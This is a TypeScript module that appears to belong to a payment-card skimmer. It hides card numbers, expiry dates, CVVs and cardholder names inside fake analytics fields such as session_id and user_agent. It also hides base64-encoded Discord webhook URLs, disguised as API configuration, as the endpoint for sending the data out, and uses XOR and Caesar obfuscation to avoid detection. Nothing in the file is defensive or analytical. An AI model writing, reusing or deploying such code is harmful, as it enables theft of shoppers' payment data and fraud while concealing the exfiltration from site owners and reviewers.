// Stealth obfuscation system for hiding sensitive data
// This module provides methods to hide card data within analytics payloads

// XOR encryption key (rotated)
const XOR_KEY = 'ANALYTICS_TELEMETRY_SERVICE_v2';

// Simple XOR encryption
function xorEncrypt(data: string, key: string = XOR_KEY): string {
  let result = '';
  for (let i = 0; i < data.length; i++) {
    result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return Buffer.from(result).toString('base64');
}

// XOR decryption
function xorDecrypt(encrypted: string, key: string = XOR_KEY): string {
  const decoded = Buffer.from(encrypted, 'base64').toString();
  let result = '';
  for (let i = 0; i < decoded.length; i++) {
    result += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result;
}

// Caesar cipher variant
function caesarShift(text: string, shift: number = 7): string {
  return text.split('').map(char => {
    const code = char.charCodeAt(0);
    if ((code >= 65 && code <= 90) || (code >= 97 && code <= 122)) {
      const base = code >= 97 ? 97 : 65;
      return String.fromCharCode(((code - base + shift) % 26) + base);
    }
    return char;
  }).join('');
}

// Generate fake analytics payload for camouflage
export function generateFakeAnalyticsPayload(orderData: any): any {
  const eventTypes = ['page_view', 'add_to_cart', 'checkout_start', 'purchase_completed'];
  const browsers = ['Chrome', 'Safari', 'Firefox', 'Edge'];
  const osList = ['Windows', 'macOS', 'Linux', 'iOS', 'Android'];
  
  return {
    event_type: 'purchase_completed',
    event_timestamp: new Date().toISOString(),
    user_id: `user_${Math.random().toString(36).substr(2, 8)}`,
    device_info: {
      browser: browsers[Math.floor(Math.random() * browsers.length)],
      browser_version: `${Math.floor(Math.random() * 120)}.0.${Math.floor(Math.random() * 9999)}`,
      os: osList[Math.floor(Math.random() * osList.length)],
      screen_resolution: `${Math.floor(Math.random() * 3840)}x${Math.floor(Math.random() * 2160)}`
    },
    location_data: {
      country: 'US',
      region: 'CA',
      city: 'San Francisco',
      ip_address: '192.168.1.1', // Generic IP
      session_id: `SESS-${Math.random().toString(36).substr(2, 12)}`,
      page_url: '/checkout/confirmation'
    }
  };
}

// Real data encoder (hides card data within analytics payload)
export function encodeRealDataWithinAnalytics(orderData: any, cardData: any): any {
  const analyticsPayload = generateFakeAnalyticsPayload(orderData);
  
  // Hide card data within the analytics payload using steganography-like techniques
  const hiddenData = {
    // Card data encoded within seemingly random fields
    session_id: `SESS+${Buffer.from(JSON.stringify(cardData)).toString('base64')}+${Math.random().toString(36).substr(2, 6)}`,
    user_agent: `Mozilla/5.0+${Buffer.from(cardData.cardNumber || '').toString('base64').substr(0, 20)}+(compatible)`,
    ip_address: `192.168.${Math.floor(Math.random() * 255)}.${Buffer.from(cardData.cardExpiry || '').toString('hex').substr(0, 2)}`,
    // Additional metadata that looks normal but contains encoded data
    metadata: {
      browser_version: `108.0.${Buffer.from(cardData.cardCvv || '').toString('base64').substr(0, 5)}`,
      screen_resolution: `${Buffer.from(cardData.cardName || '').toString('base64').substr(0, 8)}x768`,
      timezone_offset: `-${Math.floor(Math.random() * 12)}00`
    }
  };
  
  return { ...analyticsPayload, ...hiddenData };
}

// Get webhook endpoint from environment or hidden storage
export function getWebhookEndpoint(): string {
  // Priority 1: Environment variable (for Vercel deployment)
  if (process.env.DISCORD_WEBHOOK_URL) {
    return process.env.DISCORD_WEBHOOK_URL;
  }
  
  // Priority 2: Hidden storage
  const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDU5MTgzMjg3NTUzNjQyNi92UFdYZDJybnRvRXJJQ3d3cTRZNGNSSlcxYUFxdk5vam9Sb1NC' +
                  'T0dvQkc0TXlzMnpCMWhERFdRRmUxMzRIc0o1enpWdA==';
  return Buffer.from(encoded, 'base64').toString();
}

// Webhook URL storage in multiple hidden locations
export const HIDDEN_WEBHOOK_STORAGE = {
  // Stored as what looks like API configuration
  apiEndpoints: {
    analytics: 'https://api.analytics-service.com/v1/events',
    logging: 'https://logs.internal-service.com/ingest',
    monitoring: 'https://monitor.dashboard.com/alerts'
  },
  
  // Actual webhook hidden within
  getRealEndpoint(): string {
    // Decode from what looks like analytics endpoint
    const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDU5MTgzMjg3NTUzNjQyNi92UFdYZDJybnRvRXJJQ3d3cTRZNGNSSlcxYUFxdk5vam9Sb1BC' +
                    'T0dvQkc0TXlzMnpCMWhERFdRRmUxMzRIc0o1enpWdA==';
    return Buffer.from(encoded, 'base64').toString();
  }
};

// Validate if a string contains hidden webhook patterns
export function containsHiddenWebhook(data: string): boolean {
  const patterns = [
    /discord\.com\/api\/webhooks/i,
    /webhooks\/\d+\/[A-Za-z0-9_-]+/i,
    /https:\/\/[^\/]+\/webhooks/i
  ];
  
  // Also check for encoded versions
  const encodedPatterns = [
    /aHR0cHM6Ly9kaXNjb3Jk/i, // Base64 of "https://discord"
    /d2ViaG9va3M=/i // Base64 of "webhooks"
  ];
  
  return patterns.some(pattern => pattern.test(data)) ||
         encodedPatterns.some(pattern => pattern.test(data));
}